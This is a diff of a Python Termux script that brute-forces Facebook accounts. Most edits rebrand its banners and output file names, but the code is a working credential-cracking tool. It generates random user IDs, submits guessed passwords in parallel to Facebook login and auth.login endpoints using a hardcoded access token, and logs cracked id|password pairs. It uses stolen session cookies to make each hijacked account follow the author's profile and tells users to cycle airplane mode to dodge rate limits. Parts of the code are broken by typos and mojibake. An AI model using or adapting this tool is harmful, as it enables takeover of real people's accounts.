@@ -11,12 +11,12 @@ try:
 	import requests
 except ImportError:
 	os.system("pip install requests")
-
+ 
 try:
 	import concurrent.futures
 except ImportError:
 	os.system("pip install futures")
-
+ 
 import os
 import sys
 import time
@@ -83,15 +83,15 @@ def clear():
 # BACK
 def back():
 	login()
-
-ahsan="ALE-"
-imt="-M4786=="
-ak="AHSAN-"
+ 
+Mrdevil="mrd-"
+imt="-brand=="
+ak="-pro"
 myid=uuid.uuid4().hex[:10].upper()
 try:
-	key1 = open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'r').read()
+	key1 = open('/data/data/com.termux/files/usr/bin/.MRD-cov', 'r').read()
 except:
-	kok=open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'w')
+	kok=open('/data/data/com.termux/files/usr/bin/.MRD-cov', 'w')
 	kok.write(myid+imt)
 	kok.close()
 def login():
@@ -114,7 +114,7 @@ def jalan(z):
 	for e in z + '\n':
 		sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
 ############### #LOGO############## ## 
-
+ 
 # LOGIN
 def Public():
 	clear()
@@ -174,19 +174,19 @@ def File():
 			clear()
 			print(logo)
 			try:
-				fileX = input ('\n [+] Enter file path : ') 
+				fileX = input ('\n [+] FILE NAME : ') 
 				for line in open(fileX, 'r').readlines():
 					id.append(line.strip())
 				setting()
 			except IOError:
 				exit("\n [!] file %s not found"%(fileX))
-
+ 
 def setting():
 	hu = ("2")
 	if hu in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua)
-
+ 
 	elif hu in ['2','02']:
 		muda=[]
 		for bacot in sorted(id):
@@ -204,8 +204,8 @@ def setting():
 		print (' [!] Choose Correct Option')
 		exit()
 	clear()
-	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 \033[1;97m')
-	hc = input ("\n [#] method : ")
+	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 [BEST] \033[1;97m')
+	hc = input ("\n [+] Method : ")
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['2','02']:
@@ -228,7 +228,7 @@ def passmenu():
 		
 def first():
 	clear()
-	print(logo);print( ' [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
+	print(logo);print( '\n\033[1;94m [!] BRUTE  HAS BEEN START \n\033[1;96m [!] Turn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -255,7 +255,7 @@ def first():
 				pool.submit(crack,idf,pwv)
 def name():
 	clear()
-	print(logo);print( '\n [] OK Result Saved To : \033[1;92mOK/%s\033[1;97m\n [] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			try:
@@ -275,7 +275,7 @@ def name():
 				pass
 def name2():
 	clear()
-	print(logo);print( '\n [] OK Result Saved To : \033[1;92mOK/%s\033[1;97m\n [] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -309,7 +309,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ MMS ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[MMS] %s/%s | [OK] %s | [CP] %s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -324,20 +324,20 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m [ MMS,𝑂𝐾 ] {idf} | {pw}')
-				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				print( f'\r\x1b[1;91m[JUTT-BR4ND-OK] {idf} * {pw}')
+				open('OK/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ MMS,𝑂𝐾] {idf} | {pw}')
+				print(f'\r\x1b[1;91m [JUTT-BR4ND-OK] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
+				open('/sdcard/DEVIL-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
-
+ 
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
@@ -348,7 +348,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ MMS ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[MMS] %s/%s  [OK] %s |  [CP]:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -362,20 +362,20 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;91m [ MMS,𝐶𝑃 ] {idf} | {pw}')
+				rint( f'\r\x1b[1;92m [Successfull-MadeehaI] {idf} * {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ MAFIA,𝑂𝐾 ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [MMS] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/MAFIA,𝑂𝐾.txt','a').write('%s\n' % wrt)
+				open('/sdcard/MR_DEVIL-OK','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
-
+ 
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
@@ -386,24 +386,31 @@ def follow(ses,coki):
 	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=SILENTHACKER0001', cookies={'cookie': coki}).text, 'html.parser')
 	get = r.find('a', string='Follow').get('href')
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
-
-logo ="""  \033[1;32;40m
-   __  _
- |  \/  |
- | \  / |
- | |\/| 
- | |  | |
- |_|  |_
-
-\033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-\033[1;97mA̳U̳T̳H̳O̳R̳>>>>\033[1;97m»»\033[1;97mMAFIA REYESS✓✓
-\033[1;32mF̳A̳C̳E̳B̳O̳O̳K̳>>>\033[1;31m»»\033[1;32mMAFIA REYESS✓✓               
-\033[1;97mW̳H̳A̳T̳S̳A��P̳P̳>>>\033[1;97m»»\033[1;97m+93783361438✓✓
-\033[1;32mG̳I̳T̳H̳U̳B̳>>>>>>>\033[1;31m»»\033[1;31mCrimanl313✓✓
-\033[1;31mV̳E̳R̳S̳I̳O̳N̳>>>>>>>\033[1;31m»»\033[1;32m0.9✓✓   
-\033[1;32mT̳O̳O̳L̳ S̳T̳U̳T̳A̳S̳>>>>\033[1;31m»»\033[1;32mF̳R̳E̳E̳✓✓
-\033[1;35mMAFIA F̳U̳L̳L̳ W̳O̳R̳K̳I̳N̳G̳ C̳O̳M̳M̳A̳N̳D̳S̳ T̳E̳R̳M̳U̳X̳✓✓
-\033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"""
+ 
+logo = """      
+/033[91;1m ____  _____  _  _   _   _ _____  
+ 
+ ███▄ ▄███▓ ███▄ ▄███▓  ██████ 
+▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒▒██    ▒ 
+▓██    ▓██░▓██    ▓██░░ ▓██▄   
+▒██    ▒██ ▒██    ▒██   ▒   ██▒
+▒██▒   ░██▒▒██▒   ░██▒▒██████▒▒
+░ ▒░   ░  ░░ ▒░   ░  ░▒ ▒▓▒ ▒ ░
+░  ░      ░░  ░      ░░ ░▒  ░ ░
+░      ░   ░      ░   ░  ░  ░  
+       ░          ░         ░  
+                               
+\x1b[1;93m----------------------------------------------------------------------------------------------------------------------
+\033[1;97m═════════════════════════════════════╮
+\x1b[1;93m[+] 𝗔𝗨𝗧𝗛𝗢𝗥   :MAFIA                   \033[1;32m║
+\x1b[1;93m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 :MAFIA                 \033[1;32m║
+\x1b[1;92m[+] 𝗚𝗜𝗧𝗛𝗨𝗕   :(Criminal313)                       \033[1;32m║
+\x1b[1;93m[+] TEAM     \x1b[1;92m:(ALONE)            \033[1;32m║
+\x1b[1;93m[+] WHATSAPP :(+93783361438)           \033[1;32m║
+\x1b[1;93m[+] 𝗩𝗘𝗥𝗦𝗜𝗢𝗡  :    1.1                         \033[1;32m║
+\033[1;93m═════════════════════════════════════╯
+"""
+ 
 class Main:
 	def __init__(self):
 		self.id = []
@@ -413,63 +420,66 @@ class Main:
 		os.system("clear")
 		print(logo)
 		print("")
-		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
-		print("\033[1;37m𝗡𝗢𝗧𝗘 : Approval ke liye channel subscribe kre")
-		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ")
+		print("\033[1;32m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
+		print("\033[1;32m      NOTE : APPROVAL FREE ALL USER")
+		print("\033[1;32m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
 		
 		
 		print("")
-		print("\033[1;37m [1] 𝗙𝗶𝗿𝘀𝘁 join my group  ")
-		print("\033[1;37m [2] 𝗘𝘅𝗶𝘁")
+		print("\033[1;93m [1] First JOIN MY TERMUX GROUP  ")
+		print("\033[1;93m [2] EXIT")
 		print("")
-		Baloch = input("\n\033[1;37m  Choose : \033[1;32m")
+		Baloch = input("\n\033[1;91m  Choose : \033[1;32m")
 		if Baloch in ["", " "]:
 			exit()
 		elif Baloch in ["2", "02"]:
 			print("    Thanks♥️")
-			exit() 
+			exit()
 		elif Baloch in ["1", "01"]:
-			os.system("xdg-open https://www.facebook.com/profile.php?id=100000600244990&mibextid=ZbWKwL")
+			os.system("xdg-open  https://www.facebook.com/profile.php?id=100000600244990&mibextid=ZbWKwL")
 			print("")
 			time.sleep(3.0)
-			print("\033[1;37m    𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗔𝗣𝗣𝗥𝗢𝗩𝗔𝗟 ")
+			print("\033[1;37m    CHECKING APPROVAL ")
 			print("")
-			input("\n\033[1;37m TYᑭᗴ Tᕼᗴ Oᗯᑎᗴᖇ ᖴᗩᑕᗴᗷOOK ᗩᑕᑕOᑌᑎT ᑎᗩᗰᗴ \033[1;37m")
+			input("\n\033[1;37m TYPE THE NAME  \033[1;37m")
 			time.sleep(3.1)
 			print("")
-			print("\033[1;32m ᗯᗴᒪᑕOᗰᗴ TO ••MAFIA•• ᗷᖇᗩᑎᗪ TOOᒪՏ")
+			print("\033[1;32m WELCOME TO MAFIA   TOOLS")
 			time.sleep(3.0)
 			os.system("clear")
 		print(logo)
-		print("\n [1] File Cloning")
-		print(" [2] Public Cloning(error)")
-		print(" [3] Create File")
-		print(" [4] 2005-10 Cloning")
-		print(" [5] 2011-16 Cloning")
-		print(" [6] Exit Programming\n")
-		MMS =input(" Choose : ")
-		if MMS in ["1", "01"]:
+		print("\033[1;32m===========================================================")
+		print("-----------------------CHOOSE METHOD-----------------------")
+		print("\033[1;37m===========================================================")
+		print(" \033[1;32m[1]\033[0;93m File Cloning ")
+		print(" \033[1;32m[2] Public Cloning")
+		print(" \033[1;32m[3] Pak Random Cloning")
+		print(" \033[1;32m[4] 2006-2012 ")
+		print(" \033[1;32m[5] 2004-2008 ")
+		print("\033[1;32m [E] Exit \n")
+		UZAIR =input(" \033[1;32mCHOOSE : ")
+		if UZAIR in ["1", "01"]:
 			File()
-		if MMS in ["2", "02"]:
+		if UZAIR in ["2", "02"]:
 			Public()
-		if MMS in ["3", "03"]:
-			os.system("python Dump.py")
-		if MMS in ["4", "04"]:
+		if UZAIR in ["3", "03"]:
+			os.system("python2 mrd1.py")
+		if UZAIR in ["4", "04"]:
 			self.old()
-		if MMS in ["5", "05"]:
+		if UZAIR in ["5", "05"]:
 			self.old2()
 			exit()
 		else:
 			print (" Select Correctly ")
 			time.sleep(1)
 			Main()
-
+ 
 	def old(self):
 		x = 111111111
 		xx = 999999999
 		idx = "100000" 
 		os.system('clear');print(logo)
-		limit = int(input(" \n\033[0;95m[+]\033[0;93m FACEBOOK ACCOUNT CRACKER - LIMIT 99999: "))
+		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -478,50 +488,34 @@ class Main:
 			
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
+				print("\n\033[1;32m [!] Ex(123456) FOR Old IDZ\033[1;37m ")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
-				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
-				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
-				print("%s [!] USE FLIGHT MODE IF NO ACCOUNT CRACK\x1b[0m\n"%(P))
+				print("     \033[0;93m   Premium Mode  Activated")
+				print("\n\033[0;94m [+] BRUTE HAS BEEN STARTED")
+				print(" \033[0;96m[+] Note : 50% CP Account'S Open Just Now")
+				print(" [!] 𝗜𝗙 𝗡𝗢 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 𝗨𝗦𝗘 𝗔𝗜𝗥𝗢𝗣𝗟𝗔𝗡𝗘 𝗠𝗢𝗗E UNTILL DEATH")
+				print("\033[0;94m------------------------------------------------")
+				print("\n")
+				print("\033[1;37m")
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
-			exit("\n\n [>>] CRACK COMPLETE...")
+			exit("\n\n \033[1;37m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks for using my tool...")
 		except Exception as e:exit(str(e))
-
+ 
 	def api(self, uid, pwx):
 		rua = random.choice([
-			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
+		"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 			  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
   "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
   "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)",
   "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2",
   "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
   "Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
-  "Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.1.8.1295 Mobile Safari/537.36",
-  "Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 Instagram 169.1.0.29.135 Android (22/5.1; 320dpi; 720x1280; OPPO; A1601; A1601; mt6755; en_GB; 262886987)",
-  "Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36 YaApp_Android/10.20 YaSearchBrowser/10.20",
-  "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1606 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/5.5.5',
-  "Mozilla/5.0 (Linux; Android 10; vivo 1920; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.8.0.1",	 
-  "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 GSA/11.18.11.21.arm",
-  "Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 OPR/52.2.2254.54723",
-  "Mozilla/5.0 (Linux; Android 7.1.1; OPPO CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36",
-  "Mozilla/5.0 (Linux; Android 8.1.0; CPH1819 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36",
-  "Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36 YaApp_Android/9.00 YaSearchBrowser/9.00",
-  "Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36",
-  "Mozilla/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36 YaApp_Android/11.20 YaSearchBrowser/11.20",
-  "Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36 OPR/51.0.2254.150807",
-  "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.149 Mobile Safari/537.36 GSA/11.0.10.21.arm",
-  "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36 GSA/10.94.12.21.arm",
-  "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 GSA/10.84.19.21.arm",
-  "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1802 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36",
-  "Mozilla/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36 YaApp_Android/10.61 YaSearchBrowser/10.61",
-  "Mozilla/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 YaApp_Android/10.70 YaSearchBrowser/10.70",
-  "Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
   "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
   "Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
   "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
@@ -879,12 +873,12 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ MAFIA ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [+]%s> /[MMS]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
 			ses = requests.Session()
-			headers = {
+            headers = {
     'authority': 'www.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
@@ -907,29 +901,29 @@ class Main:
     'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'viewport-width': '980',
 }
-			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
+			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ MAFIA,𝑶𝑲 ] %s | %s\033[0;97m         "%(uid, pw))
-				print ("\r \033[0;92m Congrats Bro ")
+				print("\r \033[1;32m[MMS-OK]%s | %s\033[1;32m         "%(uid, pw))
+				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-MAFIA-𝑶𝑲.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("MMS-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ MAFIA,𝑪𝑷 ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[1;32m[MMS] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-MAFIA,𝑪𝑷.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("MMS-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
-
+ 
 		self.loop +=1
-
+ 
 	def old2(self):
 		x = 1111111111
 		xx = 9999999999
 		idx = "10000" 
 		os.system('clear');print(logo)
-		limit = int(input("\n \033[0;95m[+]\033[0;93m FB ACCOUNT CRACKER - LIMIT 50,000: "))
+		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -938,21 +932,25 @@ class Main:
 			
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
+				print("\n\033[1;32m [!] Ex(123456) FOR Old IDZ\033[1;37m ")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
-				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
-				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
-				print("%s [!] USE FLIGHT MODE IF NO ACCOUNT CRACK\x1b[0m\n"%(P))
+				print("     \033[0;93m   Premium Mode  Activated")
+				print("\n\033[0;94m [+] BRUTE HAS BEEN STARTED")
+				print(" \033[0;96m[+] Note : 50% CP Account'S Open Just Now")
+				print(" [!] 𝗜𝗙 𝗡𝗢 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 𝗨𝗦𝗘 𝗔𝗜𝗥𝗢𝗣𝗟𝗔𝗡𝗘 𝗠𝗢𝗗𝗘 UNTILL DEATH")
+				print("\033[0;94m------------------------------------------------")
+				print("\n")
+				print("\033[1;37m")
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
-			exit("\n\n [>>] CRACK COMPLETE...")
+			exit("\n\n \033[1;37m>>[PROCESS COMPLETE... \n\033[0;92m >>[THANKS FOR USING JITT-BR4ND TOOL...")
 		except Exception as e:exit(str(e))
-
+ 
 	def api(self, uid, pwx):
 		rua = random.choice([
